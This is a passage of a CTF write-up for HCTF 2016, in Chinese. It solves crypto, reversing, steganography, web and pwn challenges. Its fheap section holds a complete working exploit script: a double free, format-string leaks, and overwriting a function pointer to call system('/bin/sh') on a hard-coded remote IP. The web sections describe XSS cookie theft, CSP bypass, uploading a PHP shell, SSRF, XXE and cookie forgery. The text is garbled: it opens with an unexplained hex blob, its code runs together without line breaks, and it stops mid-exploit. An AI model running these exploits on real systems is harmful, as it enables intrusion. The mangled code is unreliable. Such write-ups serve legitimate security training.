91df3028341d64bc173ac97ebcdb77cbc93276050e428bc96b4b639296a815641e9281d8ba1028cdc395877889e5b39a30f13682f4bee5026ab1a63218b1a099fb1364bf0040bb5769c92aad8f9215b7ff4d3b51a37f6384124d761f4cc1fd12da4e4c165896b78496ef1a71e1e3d8370469ebfcbe3e611a1573b6a89a07942b86727a79ad57fb14c67826a546acf8d12bb7411f0c1aba989a80c7b24afb5ebc216beda3eeb90894459c984a2f6b31ea755481c7fed9c14e2f9497ce99fc68e085bd8ad6841b37556d7bb8282ae0b4bf3160f99f6f9cc7b762548f7cc82d8aa656df5cf1178bfa4f237bfd71c8303a4277aea97df59606455c2050778d62b9803c87411f49c1816dacb1b1337647082f00983d167204d2c20b3cabc603fe0746d5110dff5a7beac602d5d3552757c7ffdc53132d913b810861f807861b41931dc244a2391f17456962080c010bb781a88de38778aacd4c4fed7c8be701c45eab643202c6ee0794167accd911103ab0310c1e3a7301b8d0b011b11da3d19defb8fb7e43f290a96a376115a58463d2629ed56955fcba4255295a35888534cd9118c006d3be48d3309a988f6d10b98d53a3f2fcfe3cc2ece34a6938e7b638a09120bf8b43ec1ab5411918f00f7951120e706bd2d3fcbf3b02420b76607275855b0f1013617907bd97611941a3b59b303c2f269cfb9efda02b720781Limport primefact=primefac.modinv(e,bt)%btu=211757679145028339938159484490447515548960143376668686540553739283248408071060409284215944478501055427457658526200153976152365874273290079822453866683250687702248578806253044320606491556393838710622190294900967609883011924833456481340748552987157053533389305302512414202183400445958479477845751print u*t-1def num2str(num):    tmp=hex(num)[2:].replace(""L"","""")    if len(tmp) % 2 == 0:        return tmp.decode(""hex"")    else:        return (""0""+tmp).decode(""hex"")last=(u*t-1) % ((2**6)*3*5*7*13*19*73*151*163*1693*3853*9941)all=[2,2,2,2,2,2,3,5,7,13,19,73,151,163,1693,3853,9941,last]for i1 in all:    testphin=(u*t-1)/i1    try:        d=primefac.modinv(e,testphin)%testphin    except:        continue    print pow(c,d,n)    print num2str(pow(c,d,n))Crypto So Coolgen_key中看出n的第128比特到128+640bit是u，也就是p的前面640个bit。以前弄格基规约的时候用过的一份github上的sage代码可解：https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/coppersmith.sage解出的是pbar-p，用pbar减去该值即可。from Crypto.Util.number import long_to_bytes, bytes_to_longfrom Crypto.Cipher import DESkey = ""abcdefg1""def pi_b(x, m):   '''   m:      1: encrypt      0: decrypt   '''   enc = DES.new(key)   if m:      method = enc.encrypt   else:      method = enc.decrypt   s = long_to_bytes(x)   sp = [s[a:a+8] for a in xrange(0, len(s), 8)]   r = """"   for a in sp:      r += method(a)   return bytes_to_long(r)def num2str(num):    tmp=hex(num)[2:].replace(""L"","""")    if len(tmp) % 2 == 0:        return tmp.decode(""hex"")    else:        return (""0""+tmp).decode(""hex"")n=0xa3f7fc8a9cdbf7029c529178d96cbf2228e36fbd704a7d383695f6e8eb54cfd58f2c13c55a5d0dae2be170865f92624c183e20d31e2d8c5a9b1481d32fd19f4e4f90fc4cea43238cd8c613bda744812361d5f4fdee12721a7e464fad69bdb5a8c5b687e2ae2f203cc620a096ad11ecf2bf155bf4f1c10dff7384a4a566965d6257a6dd588d223985c042947ee5ea5ff003283cb6bf89771901b2f1b1c890895861a1461b22639c1635abc50779fe5163eec1ffff9733bca4c33f593d4dfecfdca03d4cc2e220b2f323d1c3eec12889a23d1b0d5c00ae8070cb2d09a972ab23d0b4d70824335569eaa51539c3557b14972bcc1dd794e0ff997bb032acce40e567Le=0x10001e2=0x76b3c=0x48c22e2c71354fc7b6b9237e1e14563c9144243ffbef424c39fd1ee293fcf6569d0edc0ad807deaf1d47b34bcad0e7aeff5cf6efa39445773c1743b31ee4c70cff62f5906a14efdc74304258950f1dddb09ffac8d683d7d9ab436430bd4ff643bb51767632c002c97d75559b5ac4dda6cc1c1426b0d992b0783f6b7f521a1fb96ccd41078fde1d76e0509d7828fc50673a668e99889ef729d68260b2c458356fcbcdb0af21da831eeb06c98a48dc235b1d46e6451b4d22a2668e5b429534cfedbd1dbdb8ace6323844c9a52eb9dc8dfe9d26268f180d8e5f27d5fc7ee7e0022a4879cc68a0c9a46129bd25eac5758088a6cdc33d9458f72b381d931c212be51Lu=int(bin(n)[2:-1][128:128+640],2)p4=pi_b(u,0)print bin(p4)temp=""1101111100001101011101100001010001101110000110001111111100010100111000010001110001011100000111001000111100000010101101011011010010011101001100111010010100011010111011001001111101000111111111110101101100010101111111111101111100100000010010111011010100000111001101010001110101010111100010001100010111111001001110010010011101100001001011111101011110111011011111000100010000111001000101011101001110100011110100101010100000001001101011111111100011110010010110111000111001010010111101111110001001010101001101101000000101011010000011100001001100000011111011011010000110010100111000011101110000110001010010010000010111000111100110010111110010111111""temp2=""1""*384print len(temp+temp2)qbar =int(temp+temp2,2)cha=15483423385776591648944200564143931994102240603631297038751816607837858072316729972685015604287550574333116738645234q=qbar-chap=n / qimport primefacd1=primefac.modinv(e,(p-1)*(q-1)) % ((p-1)*(q-1))d2=primefac.modinv(e2,(p-1)*(q-1)) % ((p-1)*(q-1))print d1print d2t1=pow(c,d1,n)t2=pow(c,d2,n)print num2str(t2)Crypto So Amazing首先t是n的前1024bit，yu是t的前半部分，yl是t的后半部分，通过如下方法可以计算出spub和spriv：t=int(bin(n)[2:][0:1024],2)yu=int(bin(t)[2:][0:512],2)yl=int(bin(t)[2:][512:],2)xu=F_hash(yl)^yuxl=H_hash(xu)^ylspub=int(bin(xl)[len(bin(xl))-256:len(bin(xl))],2)spriv=pow(spub,b,P)print sprivspriv作为种子进行了若干次随机生成了p，不知道随机的次数，后面本以为和2差不多，但是第一次是被sage和python的random的序列不一样坑了。解决了这个问题后，发现还是解不出来。后爆出一个hint，给了一个不够2/3bit的泄露也可以解的脚本，而后跑出。from rrr import get_p4n = 0xf7a8a487bc5c8127ac30cfbfc08e042580f359edce3db416b8a9abcb0e8dcac5404bb0eea3076966a78bb8e726e6fea79d305cc7c2cddb3dd2578a64b5591df1c9716878f35f1967398861cb368886b60c6d0c2984be3ead8dcdd80d68bb094805068b5d157c16d2b56cf0c3f06797b07bf3a7ab2a5099762958feaf72a212a63c74a4fb7da4092e6a91e72bf74ee961b995545891290c50cb28151b540efdedef9d4cc1c104758050c21dda8be8310fc7e005a08cedbcc8500fe0f9fdaa044e7cb07387060358add1d82521b5f8697b6a8ca2bd19a363bae7558e94404a1c4b82ee98878f9dff0e21030e020c698778aa645001f4c7726d3ac04720295975c9Lpbits = 1024g_p = get_p4()while True:    p4 = g_p.next()       #p4 = 0x81a722c9fc2b2ed061fdab737e3893506eae71ca6415fce14c0f9a45f8e2300711119fa0a5135a053e654fead010b96e987841e47db586a55e3d4494613aa0cc4e4ab59fc6a958b5    kbits = pbits - 576    p4 = p4 &lt;&lt; kbits    PR.&lt;x&gt; = PolynomialRing(Zmod(n))    f = x + p4    x0 = f.small_roots(X=2^kbits, beta=0.4)    if len(x0) == 0:        continue    print ""x: %s"" %hex(int(x0[0]))    p = p4+x0[0]    print ""p: "", hex(int(p))    assert n % p == 0    q = n/int(p)    print ""q: "", hex(int(q))    print ""p4: "", hex(p4)    break生成p直接计算：from Crypto.Util.number import size, getPrime, long_to_bytes, bytes_to_long, isPrime, getRandomNBitIntegerfrom hashlib import sha512def int_add(x1, x2):   return bytes_to_long(long_to_bytes(x1) + long_to_bytes(x2))def H_hash(x):   h = sha512(long_to_bytes(x)).hexdigest()   return int(h, 16)def F_hash(x):   h = sha512(long_to_bytes(x/4)).hexdigest()   return int(h, 16)P=0xab72f3a7d42573afe7a71c23dbe3cf8feb7d8b9026a9b1c6174a0c598ceb88a1Lb=9718272430951996082n= 0xf7a8a487bc5c8127ac30cfbfc08e042580f359edce3db416b8a9abcb0e8dcac5404bb0eea3076966a78bb8e726e6fea79d305cc7c2cddb3dd2578a64b5591df1c9716878f35f1967398861cb368886b60c6d0c2984be3ead8dcdd80d68bb094805068b5d157c16d2b56cf0c3f06797b07bf3a7ab2a5099762958feaf72a212a63c74a4fb7da4092e6a91e72bf74ee961b995545891290c50cb28151b540efdedef9d4cc1c104758050c21dda8be8310fc7e005a08cedbcc8500fe0f9fdaa044e7cb07387060358add1d82521b5f8697b6a8ca2bd19a363bae7558e94404a1c4b82ee98878f9dff0e21030e020c698778aa645001f4c7726d3ac04720295975c9Lspriv=76515803399948578070392316249460231617205640228540294074078216016927174232385t = bytes_to_long(long_to_bytes(n)[:128])yu = bytes_to_long(long_to_bytes(t)[:64])yl = bytes_to_long(long_to_bytes(t)[64:])xu = F_hash(yl)^yuxl = H_hash(xu)^yls = int_add(xu, xl)print hex(s)spub = s&amp;(2**256-1)print hex(spub)spriv = pow(spub, b, P)print sprivp=0x81a722c9fc2b2ed061fdab737e3893506eae71ca6415fce14c0f9a45f8e2300711119fa0a5135a053e654fead010b96e987841e47db586a55e3d4494613aa0cc4e4ab59fc6a958b59b825931b9b5cab0bfa07c6b0c4ac673060530d5ad8fa04f63c9f026f32c243c9a67a0fd223783dce9ad2e6a0524d559ed0c905c00323db5Lq=n/pimport primeface=0x4177d=primefac.modinv(e,(p-1)*(q-1)) % ((p-1)*(q-1))c=0xae580a97fec8c445276f6eeb54f4a8d0cab61eaa78a9d5824e61c13898e2a7f78bda4432e863b0b38b84564b62b0c557822c1b997a8a11c85ecd19b9a378e285c270af791750feb2b1954b5254d4521aaf98094e28f61ece61059802162f3af63c9ea9caa02710b4cb00ad074a4029537699dde481a8055f33a17c7055f02334b977b7db508f96c483a8a5dcd424d5cb6b583c6772ae45c99c9779cddd8bd9480f2aa50661c8fdf1b4f96d09e4ad058faeb354a522be5fc8a7014f149c8382e30ff5e844f958ed9b91292cedd5f82a375788c87d363517c1db11735a5d13bfea18890e9cd289880a659d70bee79525e0a368abf2cf9fdc9d3a692098d09b7a96Lm=pow(c,d,n)def num2str(num):    tmp=hex(num)[2:].replace(""L"","""")    if len(tmp) % 2 == 0:        return tmp.decode(""hex"")    else:        return (""0""+tmp).decode(""hex"")print num2str(m)最正常的逆向一道很直接的逆向题，按照程序的逻辑一步一步来：1.首先限制输入的长度为26，然后用这个长度去解码了一个函数。2.用一个简单的xor判断前四位：得到hctf。之后再次解码函数，进行验证。3.之后进行下一次验证，首先获得大括号内的前四个字符，将其按照aci分割成两个部分3.1然后会根据之前的hctf初始化一个table。3.2用该表参与运算后，将结果和xor_result = 0x8A012F269090095DLL;比较。最后可以确定结果为The_。然后继续解码函数进入下一个验证。4.接下来是一个逻辑推到的过程，循环两次每一次将三个字节的key分解成四个字节，最后和八个字节比较，正确的结果是result_ = 5709797187881621056LL;可以推出这个六个字节为Basic_，然后进入下一层验证5.下一个判断很简单，分割重组异或和结果比较，可以推到出六字节0f_RE_，然后继续下一个判断函数。6.最后一步是明码比较。7.得到最后的key为：hctf{The_Basic_0f_RE_0A1e}48小时学会CPPCPP混淆加密template&lt;x,y&gt;A{c = enum{c=???};}然后调用A::c这种模式可以改成X A(int x,int y){return c=???;}这种函数，方便逆向；逆向后发现；V0和V1必须返回为1，接下来的校验才会进行，否则直接就是错误；Cfun10c函数是检测FLAG长度的，要使其返回1，必须是FLAG长度为27；Cfun21函数用来校验FLAG[0]~FLAG[4]以及FLAG[25]FLAG[a]^48==cArr1c[a];逆向得到hctf{********************这个过程逆向后得到}hctf{********************cfun20c(a,b)的意思就是如果a==0这个可以得到FLAG[5]=S接下来的FLAG[6]到FLAG[24]的规则一样(i&gt;=1)If(i%2==1){X=(FLAG[i+5]-((i-1)*i/2)^106)X高低4位互换X=X^cArr2c[i-1]按位异或Return X== cArr2c[i]}If(i%2==0){X=(FLAG[i+5]+((i-1)*i/2)^106)X高低4位互换X=X^cArr2c[i-1]按位异或Return X== cArr2c[i]}PAYLOAD如下FLAG是hctf{S0_Ea5y_Cpp_T3mp1at3}#include &lt;stdio.h&gt;#include &lt;vector&gt;using namespace std;vector&lt;unsigned char&gt; FLAG(27,27);  //input the flag !!!int cFun1c(int a, int b){return (a == b);};int cfun2c(int a, int b){return (a ^ b);};int cfun3c(int b){return  FLAG[b];};int cfun4c(int a, int b){return  a % b ;};const static int cfun5c(int a, int b){const static int c = b &lt;&lt; a;return c;};const static int cfun6c(int a, int b){const static int c = b &gt;&gt; a;return c;};const static int cfun7c(int a, int b){const static int c = a &amp; b;return c;};const static int cfun8c(int a, int b){const static int c = a | b;return c;};int cfun9c(int b){if (b == 0)return 0;int c = b + cfun9c(b - 1);return c;};int cfun10c(int b){ return cFun1c((FLAG.size() - 1), b) ;};int cfun11c(int a, int b){if (b == 0)return 0;return cFun1c(cfun2c(cfun3c(a), 0x20), 93);};constexpr unsigned char cArr1c[] = { 88,83,68,86,75 };int cfun12c(int a){return cArr1c[a];};int cfun13c(int a,int b){if (b == 0){return 0;}if (a == -1 &amp;&amp; b == 1){return 1;}if (b == 1){return cfun13c(a - 1, cFun1c(cfun12c(a), cfun2c(cfun3c(a), 0x30)));}return cfun13c(a - 1, cFun1c(cfun12c(a), cfun2c(cfun3c(a), 0x30)));};int cfun14c(int a, int b){if (b == 0){return cfun3c(a + 5 * cfun10c(26)) + a;}if (b == 1){return (cfun3c(a + 5 * cfun10c(26)) - a);}return 0;};int cfun15c(int a){return cfun2c(cfun9c(a), 106);};int cfun16c(int a){ return cfun2c(cfun14c(a, cfun4c(a, 2)), cfun15c(a));};int cfun17c(int a){return cfun8c(cfun6c(4, a), cfun5c(4, cfun7c(a, 0xF)));};const static int cfun18c(int a){//printf(""%d"", a);if (a == 0){return cfun17c(cfun16c(0));}const static int c = cfun2c(cfun17c(cfun16c(a)), cfun18c(a - 1));return c;};constexpr int cArr2c[] = { 0x93,0xd7, 0x57, 0xb5, 0xe5, 0xb0, 0xb0, 0x52, 0x2, 0x0, 0x72, 0xb5, 0xf1, 0x80, 0x7, 0x30, 0xa, 0x30, 0x44, 0xb };unsigned char cfun19c(int a){return cArr2c[a];};int cfun20c(int a,int b){if (a == 20 &amp;&amp; b == 1)return 1;if (b == 0){return 0;}return cfun20c(a + 1, cFun1c( cfun19c(a), cfun18c(a)));};int cfun21c(int b){if (b == 0){return 0;}return cfun11c(26 - b, cfun13c(4, 1));};int bStart(){return cfun20c(0, cfun21c(cfun10c(26)));};int mm;void dfs(int max){if (FLAG.size() &gt;= max){if (bStart()){printf(""Yes,You got it\n"");for (int i = 0;i &lt; max;i++){printf(""%c"", FLAG[i]);}}else{if (mm &lt; max){printf(""%d"",mm);mm = max;}}return;}for (char i = 0;i &lt; 127;i++){FLAG.push_back(i);dfs( max);FLAG.pop_back();}}int main(){bStart();for (unsigned char i = 1;i &lt; 20;i++){unsigned char x = cfun9c(i) ^ 106;unsigned char y = cArr2c[i -1] ^ cArr2c[i];unsigned char y_h = y &lt;&lt; 4;unsigned char y_l = y &gt;&gt; 4;y = y_h | y_l;y = y^x;if (i % 2 == 1){y += i;}else{y -= i;}printf(""%c"", y);}return 0;}gogogo魂斗罗小游戏，我有金手指我怕谁。233玩游戏得flag系列 hctf{ju5tf0rfun}你们所知道的隐写就仅此而已吗Blindwatermark隐写，在知乎上有一个答主讲了如何进行盲水印隐写，利用的是傅立叶变换吧。利用 matlab 运行搜索到的代码imageA = imread('3.bmp','bmp');fftA = fft2(imageA);imshow(fftshift(fftA))imshow(fft(rgb2gray(imread('shimakaze.bmp'))), [1,2]);Flag如下：pic again用stegsolve进行LSB检测发现在 0 通道有异常用StegSolve的Data Extract功能将隐写信息提取出来Preview 发现存在一个压缩包点击save bin在压缩包中的文件找到了flag杂项签到from Crypto import Randomfrom Crypto.Cipher import AESimport sysimport base64def decrypt(encrypted, passphrase):  IV = encrypted[:16]  aes = AES.new(passphrase, AES.MODE_CBC, IV)  return aes.decrypt(encrypted[16:])def encrypt(message, passphrase):  IV = message[:16]  length = 16  count = len(message)  padding = length - (count % length)  message = message + '\0' * padding  aes = AES.new(passphrase, AES.MODE_CBC, IV)  return aes.encrypt(message)IV = 'YUFHJKVWEASDGQDH'message = IV + 'flag is hctf{xxxxxxxxxxxxxxx}'print len(message)example = encrypt(message, 'Qq4wdrhhyEWe4qBF')print exampleexample = decrypt(example, 'Qq4wdrhhyEWe4qBF')print examplefl=""mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA==""print decrypt(fl.decode(""base64""), 'Qq4wdrhhyEWe4qBF')Re 50题目的逻辑是这样的 字符串一共20位，前面的奇数和后面的倒数的技术互换，前面一半的的偶数和后面一半的偶数为下一个偶数位+2，字符串变换后 出来是与0xcc进行异或用下表来表示的话，那么应该是 0 192 174 156 138 11进行交换7  95  73  51  3右边的+2赋值给左边的我们逆向怎么做呢，先比较的字符串异或，得到操作后的正确的字符串，再反操作字串，最后比较的key是：003CFDAC B1 00 00 00 A4 00 00 00 B5 00 00 00 87 00 00 00003CFDBC AD 00 00 00 AD 00 00 00 93 00 00 00 B9 00 00 00003CFDCC BF 00 00 00 BF 00 00 00 93 00 00 00 FD 00 00 00003CFDDC FC 00 00 00 BB 00 00 00 FF 00 00 00 B7 00 00 00003CFDEC F9 00 00 00 B8 00 00 00 ED 00 00 00 A4 00 00 00在IDA中也能看出来这些V4是输入后变换的变换后异或 再与key比较所以题目应该是 正确的flag hctf{It_1s_s0_3a5y!} 输入之后，进行上述的位变换，然后与0xcc异或，最后与上图中的key比较。将上述的key 与0xcc异或转字符串得到}hyKaa_uss_10t3{5t!h然后进行位变换str='}hyKaa_uss_10t3{5t!h's=list(str)leng=len(str)for i in range(0,leng/2,2):  temp = s[i]  s[i]=s[leng-i-1]  s[leng-i-1]=tempprint ''.join(s)for i in range(9,1,-2):  s[i] = chr(ord(s[i-2])-2)print ''.join(s)由于是栈操作得到的flag 第二位被覆盖了。我们根据格式修改一下就好了所以flag是hctf{It_1s_s0_3a5y!}&gt;&gt;&gt; level1-2099年的flag题目提示需要ios99系统找一个ios系统的useragentMozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1修改为Mozilla/5.0 (iPhone; CPU iPhone OS 99_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1再发送请求在返回包中找到包含flag的请求头level2-RESTFUL打开网页，chrome查看到xhr请求，于是对index.php尝试put请求并加上参数money（用restful的格式）得到flaglevel2-giligilihttps://github.com/ctfs/write-ups-2016/tree/master/sctf-2016-q1/web/obfuscation-180分析方法相同，但是遇到一个坑，按照xor的结果第二段字符串为b?H¹，放到网页里提示成功却不是正确的flag，猜一下，发现用y0ur代替b?H¹ 也是正确的解。level2-兵者多诡https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/找到上面这篇writeup后学习各种姿势后，照着拿到了flaglevel3-必须比香港记者跑得快http://changelog.hctf.io/README.md # 跑得比谁都快## ChangeLog 的故事## 这里是加了.git之后忘删的README.md  XD by Aklis## ChangeLog- 2016.11.11完成登陆功能，登陆之后在session将用户名和用户等级放到会话信息里面。判断sessioin['level']是否能在index.php查看管理员才能看到的**东西**。XD- 2016.11.10老板说注册成功的用户不能是管理员，我再写多一句把权限降为普通用户好啰。- 2016.10我把注册功能写好了可以看到注册的过程中包含添加一个用户初始level &gt; 0，降级该用户登陆的时候将level放入session于是判断存在条件竞争。在注册操作中降级用户之前登陆。Session中保存的用户level就不为0level3-guestbook验证码只需要爆破1-99999的数字的MD5，会有一个MD5的前四4位与网页中的相同。然后观察到返回的请求头Content-Security-Policy:default-src 'self'; script-src 'self' 'unsafe-inline'; font-src 'self' fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self'CSP策略中script可以执行inline。于是直接在message中写js代码通过location.href跳转或者xhr的方式把cookie和当前网址发送到自己的服务器上。然后观察到script 和 on 被置换为空，双写绕过即可。最后伪造cookie登陆后拿到flaglevel4-大图书馆的牧羊人扫描到.git/config 下载源码后发现登录后会将用户名加密存储在cookie中，而如果cookie解密后是admin，就能访问到后台。用comm.php里的密钥加密admin登陆上后台，有一个上传功能$files = isset($_FILES['file']) ? $_FILES['file'] : exit();if($files['type']!==""application/epub+zip"") {  exit(""Not Allow type!"");}//extract$file = new ZipArchive;$epub_name = $files['tmp_name'];$extracted_path = 'uploads/'.basename($files['name'],"".epub"").""/"";if ($file-&gt;open($epub_name) === TRUE){  $file-&gt;extractTo($extracted_path);  $file-&gt;close();阅读上传源码,只需要修改content-type让代码继续执行，去解压zip到uploads目录。于是直接上传一个有php shell的zip就拿到了shelllevel4-secret area和guestbook比较类似，也有防御xss的csp策略而且并不支持script 的 inline执行。注册登录后发现修改个人资料处提供一个上传头像的功能，然而在测试一番后发现上传处并没有什么缺陷，但是在html中发现有个功能提供302跳转http://sguestbook.hctf.io/static/redirect.php?u=而http://sguestbook.hctf.io/static/ 目录是在csp策略里script标签白名单里的，于是在头像文件里写上xss payload，上传后得到http://sguestbook.hctf.io/ /upload/e8ea98429c80cfd74e000cce900612a3。然后就只需要构造&lt;script src=http://sguestbook.hctf.io/static/redirect.php?u=/upload/e8ea98429c80cfd74e000cce900612a3 &gt; 这个标签即可绕过csp策略。script on 被过滤，也是双写绕过即可。level4-web选手的自我修养下载docker镜像misc.tar后执行命令docker load &lt; misc.tardocker run -t -i hctf/misc150 /bin/bash加载镜像并执行镜像里的bashHome目录中发现php7-opcache-override-master。于是查找到一篇资料http://www.tuicool.com/articles/ryE3Qfi利用opcache隐藏后门于是去/tmp/opcache/5c8fa39e1df122a51d720c5716df71e4/home/wwwroot/default/ 查找发现一堆bin文件。就又去home目录翻到了wwwlogs/access.log发现有多条记录直接访问/wp-includes/class-wp.php，这个文件一般来说会用包含的方式使用，猜测后门就在这里。编辑器打开/tmp/opcache/5c8fa39e1df122a51d720c5716df71e4/home/wwwroot/default/wp-includes/class-wp.php.bin 有一堆不可见字符，用strings命令提取后最后两行Base64解码后得到flaglevel4-AT Field_1ssrf 漏洞，限制了内网ip。通过302跳转可以绕过，在网址处输入http://sguestbook.hctf.io/static/redirect.php?u=http://127.0.0.1源码中有一串base64 解码即可得到flaglevel5-魔法禁书目录和前面那道题一样，只是不再有明文的密钥，而是通过cbc翻转攻击构造管理员的cookie类似于http://www.liuhaihua.cn/archives/375276.html然而注册的时候用户名控制在6-20之间。构造admin的密文需要得到同样为5位长度或者5+16长度的明文加密后的密文。恰好在这个范围之外。查看代码发现function decrypt( $string ) {  $密钥 = ""233333"";$algorithm =  'rijndael-128';$key = md5($密钥, true );$iv_length = mcrypt_get_iv_size( $algorithm, MCRYPT_MODE_CBC );$string = urlsafe_b64decode( $string );$iv = substr( $string, 0, $iv_length );$encrypted = substr( $string, $iv_length );$result = mcrypt_decrypt( $algorithm, $key, $encrypted, MCRYPT_MODE_CBC, $iv );$result = rtrim($result, ""\0"");return $result;}在解密的最后清除掉了\0所以构造admin\0的密文即可注册一个adminx的用户，得到密文 oPR4gZAqfHYnOhWw1GcX-zIEvN_1OCaamhmDLxRigpA&lt;?phpfunction urlsafe_b64encode($string) {   $data = base64_encode($string);   $data = str_replace(array('+','/','='),array('-','_',''),$data);   return $data;}function urlsafe_b64decode($string) {   $data = str_replace(array('-','_'),array('+','/'),$string);   $mod4 = strlen($data) % 4;   if ($mod4) {       $data .= substr('====', $mod4);   }   return base64_decode($data);}function decrypt2( $string ) {$string = urlsafe_b64decode( $string );$string[5] = chr(ord($string[5])^0^ord('x'));$string = urlsafe_b64encode($string);return $string;}echo decrypt2(""oPR4gZAqfHYnOhWw1GcX-zIEvN_1OCaamhmDLxRigpA"");得到密文后伪造cookie登陆。审计到upload.php中有xml的解析。于是利用xxe漏洞盲打读取根目录flag.php文件内容即可就是干（fheap）漏洞部分：删除时，由于检查的条件str_info指针在delete后并没有置空，存在double free，如下：结构体如下，存在函数指针：创建时，管理结构大小为0x20字节，而数据部分大小可控。如下： 利用点：所以可以根据fastbin，构造数据部分和管理结构大小相等，在分配时，错乱顺序，可以让数据部分和管理结构重合，从而改写函数指针，程序开启了pie，可以只改写释放函数的后两字节（其前面部分地址是一样的），将其改写成printf_plt，实现任意地址泄露，因为libc没有提供，所以可以通过printf来实现dynelf的leak函数，由于前面说的数据段和管理结构可以重叠，改写buff指针以及其函数指针，最终利用代码如下：脚本如下：from zio import *  target = ""./fheap""target = (""115.28.78.54"", 80)  def get_io(target):       r_m = COLORED(RAW, ""green"")       w_m = COLORED(RAW, ""blue"")       io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)       return io  def t_create(io, buff):       io.read_until(""3.quit\n"")       io.write(""create "")         io.read_until("":"")       io.writeline(str(len(buff)))       io.read_until("":"")       io.write(buff)  def t_delete(io, tid, padding = ""yes""):       io.read_until(""3.quit\n"")       io.write(""delete "")         io.read_until("":"")       io.writeline(str(tid))       io.read_until("":"")       io.writeline(padding)  g_io = 0g_canary = 0proc_addr = 0  def gen_payload(func_got, arg1, arg2, arg3):       #set_args_addr       set_args_addr = 0x11da + proc_addr       call_func_addr = 0x11c0 + proc_addr         payload = """"       payload += l64(set_args_addr)       payload += l64(0)            #pop rbx = 0       payload += l64(1)            #pop rbp       payload += l64(func_got)     #pop r12       payload += l64(arg3)         #pop r13       payload += l64(arg2)         #pop r14       payload += l64(arg1)         #pop r15       payload += l64(call_func_addr)         payload += l64(0)            #nouse padding : add     rsp, 8       payload += l64(0)            #pop rbx = 0       payload += l64(1)            #pop rbp       payload += l64(func_got)     #pop r12       payload += l64(arg3)         #pop r13       payload += l64(arg2)         #pop r14       payload += l64(arg1)         #pop r15       payload += l64(call_func_addr)         return payload  def leak_addr(addr):       global g_io       global proc_addr         t_delete(g_io, 1)         index0 = 9       printf_plt = 0x9d0 + proc_addr         #print ""printf_plt:"", hex(printf_plt)         payload = """"       payload += (""%%%d$s--..--""%(index0)).ljust(0x18, 'a')       payload += l64(printf_plt)[:3] + ""\x00""       t_create(g_io, payload)         padding = ""yes.aaaa""       padding += l64(addr)       t_delete(g_io, 2, padding)       #data = io.read_until_timeout(2)       data = g_io.read_until(""--..--"")[:-6]       data += ""\x00""       return data  def get_shell(system_addr):       global g_io       global proc_addr         t_delete(g_io, 1)         index0 = 9       printf_plt = 0x9d0 + proc_addr         #print ""printf_plt:"", hex(printf_plt)         payload = """"       payload += (""/bin/sh;"").ljust(0x18, 'a')       payload += l64(system_addr)[:6] + ""\x00""       t_create(g_io, payload)         padding = ""yes.aaaa""       padding += """"       t_delete(g_io, 2, padding)       #data = io.read_until_timeout(2)       io.interact()  from pwn import *def pwn(io):       global g_io       global proc_addr       g_io = io         io.read_until("":"")       io.writeline(""927e613a91620da8c5f10936faf70f4dgDR95OLX"")         t_create(io, ""a""*0x20)       t_create(io, ""a""*0x20)       t_create(io, ""a""*0x20)       t_create(io, ""a""*0x20)         t_delete(io, 0)       t_delete(io, 1)       t_delete(io, 2)       t_delete(io, 3)           t_create(io, ""a""*0x40)           release_func = 0xD6c       printf_plt = 0xb9d0         #io.gdb_hint()       #printf_plt = int(raw_input(""printf_plt:""), 16)           index0 = 9       ret_index = (0x458 - 0x348)/8 + index0       __libc_start_main_index = (0x878 - 0x348)/8 + index0       canary_index = (0x108)/8 + index0 - 1         payload = """"       payload += (""%%%d$p.%%%d$p.%%%d$p--..--""%(ret_index, __libc_start_main_index, canary_index)).ljust(0x18, 'a')       payload += l64(printf_plt)[:2] + ""\x00""       t_create(io, payload)         padding = ""yes.aaaa""       padding += ""b""*8       padding += ""c""*8       t_delete(io, 2, padding)       #data = io.read_until_timeout(2)       data = io.read_until(""--..--"")       print data       if ""--..--"" not in data:              return False         data = data[:data.find(""--..--"")]       items = data.split('.')       proc_addr = int(items[0], 16) - 0xcf2       __libc_start_main_addr = int(items[1], 16)       print ""__libc_start_main_addr:"", hex(__libc_start_main_addr)         canary_data = int(items[2], 16)       print ""canary_data:"", hex(canary_data)       print ""proc_addr:"", hex(proc_addr)       g_canary = canary_data       print ""get it""         read_got = 0x0000000000202058 + proc_addr       data = leak_addr(read_got)       read_addr = l64(data[:8].ljust(8, '\x00'))       print ""read_addr:"", hex(read_addr)       print [c for c in data]         offset = -0xb12e0       if offset == 0:              #d = DynELF(leak_addr, proc_addr)              d = DynELF(leak_addr, proc_addr, elf=ELF('./fheap'))              system_addr = d.lookup('system', 'libc')              print ""system_addr:"", hex(system_addr)                offset = system_addr - read_addr              print ""offset:"", hex(offset)         system_addr = read_addr + offset       print ""system_addr:"", hex(system_addr)         get_shell(system_addr)    import timewhile True:       try:              io = get_io(target)              if pwn(io) == False:                     continue       except Exception, e:              #raise              pass         time.sleep(2)flag如下：ASM程序实现了一个代码仿真器，他提供了一系列的类x86指令，功能也类似，并提供了make_code，能对汇编代码进行转换，里面的重点指令功能：lea dst,src 能够实现将src(寄存器或者内存地址)的地址取出来，并放到dst中去，所以可以通过lea r1,r0,取得r0的内存地址。通过栈实现任意地址读写：在内存布局中，有以下关系：|…..Libc……..||…..data…….||…..heap…….||…..stack……|仿真器中的堆栈在程序中的heap中，而在pop（伪栈下移）时，未检测上界限，可以泄露上面的地址（取内存中值），在push（伪栈上移）时，未检测下界限，可以改写stack的地址（写内存值）。而sp可以直接通过mov等指令进行改写。泄露的libc地址可以用仿真器的寄存器存储，并找到libc中environ的位置，从而得到栈的地址，该libc直接通过libc_database可以查到，最终在栈中布置好rop，在仿真代码结束后，即可获取shell。利用脚本系列如下：获取shell的带注释的asm文件如下：data:0x6c6c6568,0x726f776f,0x646cendlea r0,r0sub r1,r0,0x3054;set read_gotadd r0,r1,0x3010;leak info in r0:  r2 = [r0]mov r2,spmov sp,r0pop r0mov sp,r2mov r2,r0;libc_base addrsub r0,r2,0xd41c0push r0;leak environ_gotadd 